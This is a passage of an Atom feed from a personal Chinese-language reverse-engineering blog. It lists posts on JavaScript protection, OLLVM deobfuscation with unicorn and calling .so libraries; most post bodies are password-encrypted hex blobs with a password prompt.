6852291537cdf0b9acc60ae08273d06d70b4c903f2430d9dc807e610c93a25dccc9c7c37d5274ee874680691824ffa1196effb08a4ccb000758877602dcc8424a7f6f7bf6c0078b82dd4ed340aa05f1d0f8c16ab33e6ef002f56a1dfc5699c1abb95f0fe3ebaf87090b0d1f4ee228ae296a3f286501cde036288b9d69cbeaa5129b20169f18cef6b5cb665b4a08d42e94003a6e89fb959be030520a455808aa19020cd2df352a548263328eaceff5f24a2410376f86df5a6ecbfa9ba834696afbb2366f2bcd599945cc759b696087016c8a6f2ccff89118537dd8f77afaba71d0ba5a32e8a37a61a149f3b7a0bf7dc7110a6735747b174f90949e7a2c2b2b9dd9b0465a2cdccefeb0ac4e97e76c5c4baec4d29425e335583d61095721ab0adceccc53cc400ad39d1fd294e9f1ef141830f2122d727b4d993d94118f14bcbe9efaf73cdf69e984a12ef53da9e141e5f6dabda013e817e2c1f05b0c06f21eb42d920e8ccff2b9f464c20ac75ae2553287c44aa296f7a06eb4cd632a334e6b3d3c3c015e9c037b6331b2def096c11aba3b34abc9fb0ceff1858693b5917411e546719f097b376afe9244a681a699c4189f08fe5bd8620eba7cfa1fddfeb069dd79f4d938f6f14e8fe90432ca657df6c77400eac998c99393a68f17148652e364c82db32353ae97c5efcb55b556c36f319c4744c36702f9726589f6a1d4574f10e28767a84f69b012a4103f20e5e452d3675620e7d5ab547bf4ebd8e73cf22734f667dddd4c3620fd714ea14d891767a5f2db583b7e6a40fc1643152c975b2ecb93dba26859c6ac957aa7c5a7ee1288ea68d6304e14777338eaf363d471547fa46bee14f55223397363d41d1e56816eb6d609516167b029df3862f62471719f17f7774b9b384e67e0d671bac33f2d3a987d7f33a2d4059e7d9a6a1328846d5ccf7aadf972816cea07919664fa6d250e046ec6e6e9f01a937070266c93aabfb519a6b0d7bc4c5ac41aa4f6ee456c5e7ee3395f4b43c16c494c8c094eada99e923684a59f32572dc185580f1426ca8d7a63f40833c38295830629dcf51e95addf60f872381d0e84f167fcc688a3159934d49aea8eec4eb6f1996ea738f4efa644d47ced7d704fcae4dfdd139135b76cdc0a38f22dad6f71287c204d564b668a9c3987091520397ce5e72784a9221dcb41ccb0763162a3d2232d9c48a30d92174529358b1abb3f07fa2539050078bdc1fe701315c7db3fb4114fc447d7ec78aa5c3e7acd9d41ba84c89fa24db9656e5ecb68071e05e5926b735862219d82d9090dde219f494841dd9335555780dc60d343a840e36cab730dd9dd917a69beed1ed8f4918990b7600a2b308e0cbfb5073d11675aa711217d36810e069c9ecd986e3088e642da3e637376b0a4fc779990146da0f10947b7b2cfd90c78b7b889afbc0f0d29833ab11505b4759d6ab089a8dfe65f16bee428962668d19f18465775c5ad99b2bbbda7ae87658a8cdf7f40240c23631d3327e2da2a948e37a89db757e86130a584f7a3e1fa776c916b3602c0fe347dc48ffb8425d5547d0c9c45b64d08d4693b856c395c68cb98142a24e03738eb8ce915aefba23f0505a119070da7db70b8c5aedf565bae94e0a50c4bbfc8d86616341d4e1e5858f52ffd3b993cd5e2787fbed8aa7ff2872fe0ac1b0bb4e57ac3c1e14ee78a337852593d17b5def3c3f52e4caa9926cc79aca15b14154ee9663a49ca042d89874d689532f024f0dddc327c83854fd4f2f6aaef3ff08a457e80987bb5c6db5301897117c5e9a2910ed6b47287d572cc1a4121c8d334acfee40c9e35f3ee15a003404f5da3c47b950375a94dfb9f60303ac44fe753374a7c612518d475f5fd0b04d6a709b0c6db5550d532f9f12fca964b104fd94f0175de2e6eea395826c2a152dc9eadee134dcbb219e5f79d170e361f3041b3543c5d7da1dd10b03cd3515af123f951046660c744a6786ae79e81a02f0011eb35ee489d32b8992a31bb3f5962d3702863b2df8ffcf5a7080672356a6979f6e0f026b0de9e5cd59be6b2fe9b53d32b046f07fbfaa8d83c056a95e0923f81d9ae968015e56161d249d2d1efebfec9287ccaea690757316ae4b55d298a25c2188d57039b16fd4d3261e1fbb244a956cbc601b77fbaa9e6b115970b022551406920bda5c18a50d9f6653a5daa01d7909aefec6f1fd5240a00d5bb964e0dfa779a454b04b38a543eb650cfd22c31e2680354ef54403551f4de4b6154717b806a7632daa71c49096bd4e299164bea145089d9429179244467c0aa26d1a7e53a1e0302cf477867b3ec5a5057b6f8e6cc4800e3fdf1a032edfb8078301de7422c90187977d66faa56a5c63948339fb9ebbbcb48aee19fb70c368b50f7350fb8de95b8dbfa22bf7dbaf4d7d0f5aeb8c746e346542e50e1073239b3e575da834c411e99e692bb4c7a09acad7133fd7cb59cb88bfcf38e4e0e2c72b5fceb802f3728791d0e112606c0916a6856c6f676b087da84a4f35a87ed50145c99b80732144e107b484d434e8af47aa6ba7497daaadb1a98659ab5f3f40ac1cb01b47a8af4bd68b7ad967b11446b183b11e0217c0436a0b74e3a23a868c66010891634857ffcc27b1050093ab27cd6587a56d4f72bee4f81c390b07a4d5fbaa98e0733a2ad78b6122bf9e304fe59b125a8065021636f2d4d7d3819d1e0bf6d4c8bca2f429e33abb7d4a1100ed22ae7b1be053cc2af844a86c4782a5d76c3e1eb45f7516efd0ff62486d6935470bc56493a3505e90d7b6ccd979365534c80531ae358b2abc0ea12e04567492ff699a017248a574058fee970aee2def19a7377d34dca5a42ddc0626853fcd2df4f7727642073b56f4474340451c48a19ae327ea1cb27413618b8c9a218c89f050ae2529b9e37345840dd5d80aa3f1fb0ac35ea741dfc779d23418cc34cf1311b54007a19155eb224e5467bdb2f886c974a52cabf181de9aa1903b4cff710a12c673f65dcdb2276d423ba7c1eb2db9e8deacdce32c149396cbabf52b37e854de7f3bf866ac48dd61a8dc6fadcad7c335a20ea9eff7c9fece1deafe1f4d3915810e3eaaf8ae449942d04021cf9d01b7cf107a29b1d8092f2f0532bdbb33e941f28c8f9d6e5636057fbfa21529efc7638cb4bd14063687a22edc491f0ea27cf1f69cd3cc09854cb10cf99666b6fa495c23e083f4f8a25c711d4695a3bddda4e2ce44be51ff0b33c7f1fb79c078e7cdb3643a8cc3b2e6bbc9a3ced49b2234ebe9cffc04ee5b62ffa1a678d95fca27eaed1c36f05eaca34862bd81bb49d7c580f5dd5cdc056bf194182142670579539c39c856709b18faa6fbefd87d608026ae407e4fc8d6198d841bef4aa92ac4a17235ede864c989bbf9b4c8fb6a834d25a85a003a0db48b54392eb94b8ceea2725195335bc31a96c8b3b289c483f47cc2fcb833ba89ea72f9486b7ba8f9af191a199f6fc50f1f4c972f64e30ef168f7ce34eafd2b29e4d69ad97c27b945980d06b4e5a3b281f6875bad69eaf814f88a0207ae4ca78308f4c5e6dca8c66d42fd4d8525b3267ff125b1d4efeb76296585764952eede7a35656bf7d0b40dee44e282df574ecdf99b70d23c44c810c8d7f5e0d13dd10e3c87fb69c87fcc2582f3890ade5c05ab7ec9e204ec4c2e51d539318d0036b478706367eb21cfa04014b0b2ff75dc46687e0a9e0df446c32fb43a5f770c7ec536087ef612c8c209761fe0bd8fe72b06225bf8b56efa0a8a1ecd575a8c7dd284532d7aa7152c13b0f31b9e6d3789d7d43a4a97d6d7f92199e7efc101bc5dfd7ea5b1afbf0cc6a683705e03de474afc3170777d7de145190381e0b2ae5dda5f983fcd382b63fbaad19e1f483e033f16fb26720768c9b0be6bb9d099be5df18a8853b0d6268ca920264d7e70bf7130f360018f9f4ae04af59baa9f75536fc3c71878da7b74073e2838c41c1f8d0793ea209a8b656a92d025d8de76f9f0775f82189c91768c143f9022ac6937723b4cf5ed39da0cd99b5d8160cc437accbe69c6541cc823bb3f7af1b5469b3d95ad46f9ccfc465338b9b8f238e73d6ba97092202eb493621f55d54e2afcfe1ac481c0d72254f698f3300f2a8e302e888afc149df4b420a09e570ac747449725ed230d2840120c7fa80cdf1bbf4e6a21d5cb0c62c494d34d5dbed444130c075c0c8a8a79d7fce631c0662fa91b1c90350f412147f23c6cf8c0432bb49da5e467b8e46bb7e3ca93a365d9564faf2d25dc5425232823cff4689c13c8e8db7dabe6ce3bed50db012f6f523c71edaf86504070beb654e162046c7c7e1570ee90a2e7f932a72e15e793e0e57750bb17118aec275689ecc116197cec49fa36eac2f279c40c31dc7e3d728917c16e34b0504166fba32fffc9bf1c803a8251a42c9c56ae18e117e511d7b6bd434d373b8c77f714e65b63120e756645b2019a002e5a6ac292387a97342d7171df07e11766730e5de74818cd3156e4feb9ac6e6a98e3394ee963f08c9f6fc885ad8091f73a9d53768d513910f9d9f9d85a90d87c5782a28d1da18ce784f546b4b6c3ebabe428d7714935f4fa5206d3d82410c4ab483c05e07f6bb54d7503f7fef335a4ccb3c45d88a0e7db2751ca2dbb7d71be811f38a4238a7e9bf7914a7165df3d2c4b79b771d07aacc2c63f348706e81726528bdc9251228395d347ecf3586352887d06bbf95b02b94cc8121bd28fee696901e0e1d6c26427b4f38843cdec82af51e1806e22ba96ecc60f0a18072d900689c2626e3ffd31683ac569f7ac00900e766188f4e2eb853876ccc63a1459a37d09867cca38677be1d2ebc0980183f0e8fc8d763f91058e3dc8fbca343621d6a633259529fd19fb9943258c9793b64e238ee3fdee80562ac8908611e79c1ed4edf3c0228b516279be6c07fc51554901680776a4f4152b471aaf8424f9aa4edc8f426786f687932896c685b95ddb0e323462f06408b5aa9ca56b56cecf2ec824ec775dd1e4b92c50c9df37663f6fcab40690b7c2e018c4b8ed5750259e73a70349c803484ba0c9ccecf3bd5cb299d82abe81c7653574c34119e26cb7f16903f5b9c15485bc2497793cda92093a7d0708bf7c3b0893331e1cb64dbe43234231894c36985bac0929b4cf660c538a3c8458c82079c7ff8d1deb04f37d75fd05f857a4d420e49142e5a9755933350340a7eb053502bea703bba1f91e22df755107b8d8fbb3d56ed51d6c1d1c2165c0f7bc51582c1bb94071fb6e8f701889e011f8b41222705147a31183cc5fb47145f748debc42c08e9544a4ca21ef91437513665726d9822cc48f94f2e39fe95a1b4fd116c37c7cd39acfdb905f69fdabb700cdcd1c3e552299f5eb1d54b8f4276a7ff353cb59ac02c03bc8a514e5d4edd27276871cdf1f6d5be3412ffdce66d539a93b446a1d9bb2d3fba537fcb7f115942a0757181b9242581c19be38f9b4e25b782e9f837b72af05d87977db2025aa6e20c1ae8857be69f52e547d68fe42cbde90032bbf84da6bea7a949926998dfc50f23fa8bf4a912ba8cf435083f28f100117136260eb6abe365460239b91a1dd4a8c8767e9383986e71fd9b673fce3a9a8e31b5d8466b3e1db9810ffcd340a9d089697c5589771d90a6ef89a58ac7ac7cf67640b8f992678804a396b9452b13b5e8e624c3ac66a657dfb19ec6b42d30f4b2536a0cda0160089c0376eb6cd799bcec06883201ea4adbaccf5d22812a3663a52c5111fc1c261f2cf1b3b8c711a01205cab5d4b82d5bd760ce61e53d421122664955d1b866cdd9b422bb76e7bc7b7c05c7ba973f719db51ca186fa2765e47d97ee08684a29bf13ec2279909ebd34446fbd8cfa6ed1fb5dba8f7990da8c19a45bb795d47cd98655bff948e893ff9aabc3930bd22dc1887fdcbaae4aa89a893096a6c30c1be9c9b9280719ac101a3e605ee9b776e1cf23862672ea3300edf0eb6196ee427a1b1340b561529d120b2e1397f86268e1a6d19eacb579c67c27e186cad3e3a48738c1ce5d06a818243a8d1bd9acc9d25758aad53e9761e358cc6f3883c2dfad247351aca91f76319257b5fdc355aecd2a0616b448ba7e252e6cbb7bd4a14cf432c1c14f689f59b26823dc91394104a07a87c5797fe49a3f51bac489de78c94c6e6354d538adac45fc9a50c2a2cf2ca1f67acf644bc934d5a698c821a57b77bd0bb881c0742e31c00dc2d6636abab2f0f78715f8c280ebd2a42dd97f87b23425af425c0d0726a4e78a925d85a0ea76dba6b753d270bb7481f83946085170b9db19bdec2e5244e61a258fdfb1f1f7d26d8edba0e8d014a236142c5ee654591a64008775dc699702e6101567c8c6b554193779c478b36ef9920503779ea9db965c8ef1dd91fd1162de0dfda309e43790ce18068ad45d45eade471502fd068dd65c73ed9f240101a2c376b1c54f4e795ea16ae2ac1c375dd53a75bfa846a9a6a084f8f3393676d07585b3b44775bd73d8dd0b3957cb316c8b1b84eed2294b33fccde11f75230e0a19eed1475d2214c92df3c8b14f25b9c3264a440d33b397646af34e5324aee0776f2a3c3e35eb4b05dfea5a0b49aef0e7e2c8cb333c0d9a9de6e411aaad03d25ceafff1b1445340ed82698265a98575205b311cc82d0ecda02335047337bb108eae7c011d3c071732d58c611357420fc8d404177000e289dc57eda170125498fd7c52bfc4a26d786165a4a4baef6ef9bd3cb4433476b68ddfbaa67ca4163c9b8d41d328a4e822c93444abb9fad15bcbe137313870d14cde2c5fa22155626c579ae337cabaa180bbc91ebb3dd178f770a39124f1c591cce040e8fed73bd6a6018a27cba81525eb8102643bc8d5098a3820520f290e57e945f547f66055df943491c0adf0281a790f61502c60dec4748ed432f3c69bdb2377ea14faf64e5d323a590f512a34e95e7ad1b9b45c89cbef4ffaf57eb3cd2ede94930f573eda06e190542bcce1a0b06efa9024030b409f9a07a30d70c1f444c4c0411772ba1b78ccbde8161d2b7fe5bf872d09ece6352f0270e50d37d1341b5e217cfffc01facd5b0f5bd271e42bf0515349fdad8d0c77d570d2cc40d744b587e393f3175c6e2d714f5924edf7fa45a8408ee7cd4124b528cc515ef1c59379632291dbfbd76b483a7dcf32a2e7e79a05393d324159f7baed02686515055d1a8503504964110934a2a2ffccc2ea1e5baac2cae74b9cb694da4f9e54bd111dad70d6b29d7cf95fe4c1c48efd30364dda50e2d6a2643dfcef79207d4ac2d83d26516511e5ffe899670cdd3a07564d71b860b4b28e6b56ce881cb43643bd980b199e00d2defff9375a923c9a393b3f6e98e241e8a7bdce091bcb0d876a4970c8c54e7dcca6cfc01e2937561219a4f8a4128432db0bb6ddc2a1abc0eb25b3b1f1e98ef129cce5abe7b39243040287ba9e5e820393f09e7209c55b1947fccd05503672346801899637a31ad548b90f29bac6fa0e61e44a1ee3993a8d23842a737148e75100719390b3794808e41ac7ce93edaff3ef2fc7f7893219c08d5f8d496bc093088c6d7eaf95b7a90ba910d89975e7f31795833ee989147626c4fff1a81b053c954fc78baa67a2c22310144d260d2dd8293cbd62ff2eb57dea2dc1265cb28f9240fdb9dfc1191d6c6250051a71c6787f10c982cf3ff663317a7e37e3f253fff821972ed757fac2aa6fdc2192d0a25763f5477bc8d7a7e20924955fde3b6fbe3cb6aa5ca1394b44dd3f2bdc539bfbaaab559b55e5cddf1b6c553bf8d2991fb3aca770362cb2779d31233b14bc9ec24580df5c6beb1ee412452d63e014900f946c298bc866ab57c285e343dd3fedc0fabcc86921bd63d8b2bcb1d632bf13ac43da3213110af1b742d731d5b55aba048e38616ec82a9ee9a2e20e4fa7ac8bdd2bf745c6c2048687b1305be7e6569a57f5f848cf5da2a5a29c12d161cb36bddeecf7bff1136c47d7c294a1c75def0c1a110698291320683ec50b7fc77521c59924100248b5d827fb49f7c2c59fc962460091a6cd7da45c7fea031eb46cda87ed7b6e4e4d1f49ef8ad90eaa7c58c227f0163b405a9ce7440edb7fd353c2031eca10a00b9f84cedb32e578810d592a65b0257a5aa4a339c078c64d89881dfb1ff8461dff9e3fbc2446f3e240ac0d26a3dfc217fb840e2536427c71d6690d993fc29edcbc29eb2abdd4d3f7c016a5604f66fadd31821878256cf1fce36952e3d55772698dfc0effb5d4fd7584cafdfd91840d3179b5bb65b4c212dcc892a976f2083c1a7e02c431c40badcb4af47c842a424931baa8d46fe6b9d74bb29e1f647d35b8ce1f7cae56f0ffc8d9cf5aee639c895b1880f6f0019cc3f7bd8e7e47cc6c2f8766cdbf58979b8a298160a09f3cc8d5c15d0e5505e5837a2aebd5b7e3a83fb9972f7a079fc400f911b2809e91ee1e574344268fd2fcdf14a916d1bbfb0302f5c033881317c221759a45fac75e0b85686c2b1b9ca0e6d55ea75e8c9568da447eed6bf7ddb3e9611467a62d03149fb510613e3db4226293694aafa0101720d57e9cf504150548199cd25fc2018fcbeacd237ee2ee48435d7682c14ef6fdb7cc774890762d7f7fbd26c4b391d4bc10dd26ae4c3cc9fbd2cc34f0b8074541c8876f73b3df65608dbd7709e46e2952ed3a9a3447044414bc630405406723ce7efc4b50825217d37df95588556a53f8a178b303b1067b865399694ae07b79b1715ae63ca7f74ace90e53410cd41c41cb37b1b8ae00d680d17890d60ab3ca71d116c4bbfabc0e1618a6462379d8ccf84d0d714aa9a79be52eab5291ccee68267ce82cedfd9edc126c019666e1d85d79b142c91b699edab52e2dce6e0a82f7407a60da827ed9cb11791176e3926d795522681427f617ab313deed695d54ad3c9a79e1a67441b720a26022641124fa2762ede142b61a27b53676395e12b0b478ea6f8e3e2ed8a3ae88496bfc32b6d54da4c40f692d4d8649eadb62e5929dd3c2faaf2524541a71d0874423f99613cf120e2f2351a92145729a70ce013aaeef03a3b4817ad07e034bc4ee0df56270f5b54b8a1de1cefca716cb4e3df7922bcaf27d95b993567b91402f4fd6e1391527cda2556a0150340e9009521b478f792ecf09a474842190cb53101d405f37774ac5ea3434b13308a067c47926f61bdbab4eb37b60e08d8433b9551953b8a4d28ee16fec4f909a3bab1e4c78cbcd799cf3858e874f17b6853d185a55976f03a45576743c117a9d96de19a451d6f43a19097be5465e6b9e04cc1d64ff9dfa724ed3262743d9fe5729d8ef73f3a23c3c8cc4d8749af231fa2f632b557c2faa2f560f2d6f616edf4c8e393cd1c9fa480a5eccdb35fa80eac877344c2496b40ea8c1d0001ed6a887e4dee0f338b7230d1d96c14494a8e8c3411fc3cd159cb319cbc6a1aeb5c63716104091f0f47d1247ba3ebc93b0ec1bb73f6ff07124a2d659deab498dafc4ec3df924d50d6a1aa19215d9932b1f52bee5f684ee05bf8645b8a23e16aa889554834dea4b5c4e08fe48eabe9c01de6fb064bc4f4edbb472373fbb4398c1fec501976941c987c99355120a9875e42b6f808cd32f0212952f178da1fb518f71503c90a3bc8a7fde7524110cf6be564f666cbf9cf70b6ad29f5b51a955c28e7be7f39e3ce5cd984996572dbe63e6751dfde86cea540ebd4b283024da71a5747ebe6a28700d4d6d7b5d9382ae75f5a3ab681b8b4b5028ffa26310ab1d170cd45f0ba7d252ccb3f3300afb03b3a2fc1ee7427feedf9a2d2013cd28b2cee40686c8d7c599c58bbf83fe00c28fea3f0f46aa5ee14487c1880bf80c72e16fc8c2fae6907bd6c581067d521da27377d3fe6ac2e75f4a1a6c372f49c92dfcece3c67dfe277fb7d420697b6d71ff97ac8d738b38c9a8feada48a0cab9d9861755f9d5aa97c19a15d4f7bf1d151f7391ca05f7ff6ceebb5112245a9a7cf14483e54991557d816edf0595a897dd18281e8ff19a9e5d0876f65439ddd6586335f0af48411096764806449f4c20eb28473315aff29df1b56fd8cf57ce1ef9d310efad440478700764229e1b75ef262cc88a8da903b5ced4d842b3d2f19d9f4f71a59fe90c595ce631f945edd14af8fafa9ceff1843258d9669fd006d19b44e422408669cc5ee187daa18d87cafab2d4fac4b9ca0f0d15f6319819f5f7c81c330ba220a40745ffd5612410ec03482c5c996d9b2b5b674150eab10f2ed1b86f5a2682d3939137e494c3c6da802e238f5da3735c24fe1ebb98389a51856e01b0b1b47d32817f8612b9d587b43210d196dfc3cc3609c23432ecd55e56dac00cfe03576df6619969b79cd134eb5b0cf977da923e06591f46f94f353bb4a79255a1c9abc20e23b50a062b9c82520dbe2d2caf9e5886c75ffea53899a0a2efdf0a1f7325404c64c4048ca4ee5ac62749736f4d5cb2e0c22ac01b47e0702907584e7dc23c36dc3fe9de9ca89a71e1da33b52e05a46fa5385d1fff0416cac1b5f3f61c14b1500052bba8f550c4117187e3ed7277643a1667db58b2a0f78021c1fc6cd08fd795ba0c9c1ea86b5580f87305700f232b77f56b6a8b1cc9ddbb9247d6e81571bc10819ae8a4d586482c75eb522de7ec6cbcaf905fa6af8274ec99d9f73e1499e066b41aed1da5ee0db546a5fe85036094ff105297274290df325ac924ee1dbd8efcf730f947193b964eaf0a55ad5edd90abb8fc8bec3922cbe713b14815cb0026634daca20a10d4c1d00e472d6777d27d9cf8eb8c27d89de98c087ec47fe5bd27ae2b6292bae2ca4ade4236ca40cf5274217621e33938a2a6f7a1beb71a120f29f674f7df811a9c9d45760e9c522e06ac830446c902e07506634063755dc23d12966a13416d32dccc0eecffb3f6634a016560fcfde16dd993f39f95816200ed572b4eb6ffce71943d227ef47d37383c932477176a67487b404ff94e4d27b51a641837a89fae53910809b5da7b9cc54513fd42af790b5cd6011bf48b9e8886266e99097e9dd9564ef8f0f9834fc05aa7ba3d3bd791ca67cf9037ffab6cae98f10fe8cce8cf3ab7da7f2e59e859f68fa88158d13334237a86aeb53c9b752ab3ba8dc4a3aea6d6d2b29bf45a7b4f856ad75fc94441e4ef8b9135c179eca741575ccd70614d2c71f260353c651e5fa00d5ff3c41e018ad56156ea21fa0ac3b04cd68d4b740dd153a763706d61203b059baccbfeaf2b67d65d0dbb138ba5b4d0c26b688f462c7257e848c25f8727f1e15283baded9e5c93f6d15b3b986a9eb47b573008b1c4594c13e2b58ebcbd1fd7774215ca093d826259f582b97ede61ea73963f59ab7c82b8ae60b3b682e87bf7663fc99a96ac41bafba4b8d96e87befba47019ccc353fadfc8ccf3b43fafe24b0481f32f2e18d04c3c7ac3857177519703b5743c8a6ff0ceece2e4852a8b2e43c8dd2c8701cfbb2f010ca729351b1ebd7e5f4838462d0f1a351263cf0897884ba6287aca24dd3814044f1cef0251549958b5f0fd75b89f2ec05d54fa19d2c11224d69d9848bb17f7a3a15e865661e926b421060e076190936387923755f9d1c6b2dbcfeb7c9c18172813d5911568dbbc3cb51522fcac569e6f9c4d06cdf9ae20b3c9d516c7eb1fff4364b7881745715d88b3457473abcd02f98dac1e531ed39422f239c8498e9a794836bfb7f79a1d031466d68486918e7649b94f17116e1dda9bcd4f90a83b4923e5c7cc0acb93be0eff55ad3acddef39f09093ae8b71c6a5c1f53ada9b793da227e92ff2c841fb83f05c015a4e4b56cc309455e7106686747b90e0972abd51ef30e41a3d975a9bfae0c4f8b42523c0df4c6cd3ceb35e40568844206551dd2036ed24da7bb2bcdcbf6b949984f2196c85b62aa89723dead0884bd20bfae99e762d29a650618586c807e728fbdc1ccdcd5b35070a5cd9defc3d7ef36c948b1a4dfe520f2ceedf8c9e9f0540deb8f05c519288b1d8e4d3f7d38f82cd6fa0813a0321157f6b388dd0270a31c01dca5168a66356268747460f30b3c7eb316fd361cc9fa3c5a4a73f5aa4a530598a7d00ad6d13c856abe9e5bbfa26c130d1e79e0a23a43af67738c1ce8bc14bc67ca79d20281f7e8138b3d5b6af6bf11befd55caa2d9cf698ef81e7098b2b9d332671805c5594350ab25fa57adfb46c9f73b0f6f85651fa9dd1bf6fe0290c78037ddf687e5334e2a852465abedfb1f07b14c1b52abbf86aee7205fa1e764ca0a16c1efaa0724d084a59331fe78d389386670f3db76740696e3da127b0324d96aa42be7f94fade2d45274cbf3a05a4f818fbe3661a4746f077bf9d7e7b574a23f73f2bce0bd1acf77334b3a3e5ae1b5de28ac618e9b7314b3b53088e8b1d3fe72744556f3b0a9f2bf1d85c104bbb7661d1929594e5680d8ac9ba035a6ba7d05d754c146753c304de6a76181d8ea0a17289551ec11e4dbf3f11a3b267fd1f960b187aaf9febbaef844f19adbe97d9f2b7d045d12a80000e9e6991174804c38b948c46cd40b34d7a6c725e2037d768fd8857eefae0583688dd3b6382c21d9fc54216d461040296744b4289505f91eb8cea2d893223727afef541318cdcc2ae4060b822209475d89d662659a386010a1afc81422261c5dada724b20630cc5f971708d1bb5b3e2f97cad8f3f06d9cda70f62d865b382c0978038e3c7b3b56a7b05b3f7088a7217c64b3753b755c5054f4b5eb43e680ffe0ac87be278616f18459ee5f8c3ef450ae35b9c129329de92941b09d6f36a46cb0adea20dba94288bc1bfb37670ddd7bd107af871f55d96a0b995a09b20e3f31135101e6b38b4c279de07a86cdb354ac6ddff11ae884d806f4b6a43ff6e8f2c428457a06d8175de5e0d652337f637b4b551a3fefbf6898e1a071d71e919dc9345d1b6ec4ed898bcf27cb26358bb6528f15e422e7875647d55b72758cbfb6b719d1b82f4baa09a879db2c8c1700715c493435ace845c4f4f226e75804ff3ff9bd5256f25904adcc527fd3fed755ebd027600d72681faff52db6cafbbfc511c4d5e6837602ef640035d52c757c92de93c29bae312bcf5c3470222ff12fd5a7f73a25f6525f5147ec4d4742f61ebe3bd066e1bc4ed100a9b094d63a25fc85bc693bc7f5eca5f2c2db75cf1384136c147838a2b34dd19114bc6c1e8cc307ff4f66d269c2ef92c6a2d90a2a5c23882f962e0de3127719caf01a85be4eb3e5781ed09c2265314ef653c8fbfa687d3e2a96c6eecff1585a18b94e9fefeb56a2b402704b8594c26075abca1e850c1ba127265ba0730fa71b0af755783d693ed9fc0d035ae0067c7c952d8673da1d276a785a4f3c78cae631ec6c53904cf2a25a22953544ebb63af8691e27269d00aea2c051a3cef9ca71c00d2fb031a80afe2310637a140479612b7e1f6b8514e77c8ba8710f7c14b9c5e22f5fc93c86f30104532da2d585791bdb0df50b80a9f86b14fc7b53d814cbafe33668af36aea325c2e6521879284330e7a69d79ad7f0ca8a8422f40d8857a517d29d7ce28a0f2582061edd5da4ec031ccb81d2313d984fbe883d7378cd22e27189e3a097ca7c9d4d3965e1b9b1f1260413884f00e36ec695215ccdeaa6dec0bf4c7a1254b5d4d2ecf020787ce580a27219ab40ef1175f1c94d4b24d425518f6d5e3446e90d69b09faa8c72c022ed716dcef53cc19b7e2292765e7dfe499fbf9dec82c8f366d8f01af19ec6043332a34516003c859fb3147aa5ec3304b62155e2d08108572db9be20ef429bda8c873cb4cf80703ea02c93fdcb057d58bf0637f20f730911cf0d0f9596caf015169024b921c3da4f1e56b923ca6f6de8d0b9024bd32cb488e17423e0155b31cc3e67cf1d2306aa9c3fc8c3bac668e17389373a5d94da123095b422195a8928145e9ed0a01cd09d73a2a23212b986bcb8f8f87aafa02cf5f8d6a5e5ccfd4400c8d41624ba289b5320b2d04da7c93b097a942da7fd4afd77afe1e31</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">JavaScript代码安全防护原理</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ollvm做法</title>
    <link href="https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/"/>
    <id>https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/</id>
    <published>2023-01-02T14:06:24.000Z</published>
    <updated>2023-01-12T14:08:24.883Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start</p><span id="more"></span><h3 id="目标-处理ollvm混淆"><a href="#目标-处理ollvm混淆" class="headerlink" title="目标:处理ollvm混淆"></a>目标:处理ollvm混淆</h3><p><img data-src="/./../images/image-20230102221120506.png" alt="image-20230102221120506"></p><p><img data-src="/./../images/image-20230102221205367.png" alt="image-20230102221205367"></p><h3 id="用脚本处理该函数"><a href="#用脚本处理该函数" class="headerlink" title="用脚本处理该函数"></a>用脚本处理该函数</h3><p>在脚本中设置起始地址和文件名</p><p><img data-src="/./../images/image-20230102221258379.png" alt="image-20230102221258379"></p><p>然后执行该python文件</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>x86暴力调用so</title>
    <link href="https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/"/>
    <id>https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/</id>
    <published>2023-01-02T01:03:22.000Z</published>
    <updated>2023-01-02T08:15:42.212Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="180bbe296304f176bb56a0ad18ab58f991184c3eb739ae16c31a3877701525b5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">c++暴力调用so</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning5</title>
    <link href="https://pa1r0t.github.io/2023/01/01/unicorn-learning5/"/>
    <id>https://pa1r0t.github.io/2023/01/01/unicorn-learning5/</id>
    <published>2023-01-01T01:58:42.000Z</published>
    <updated>2023-01-01T14:05:26.105Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ed85fe89671e944de9c289dcad566fce7e7d9bbff58d5a5a57074ada5ae20cb"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" 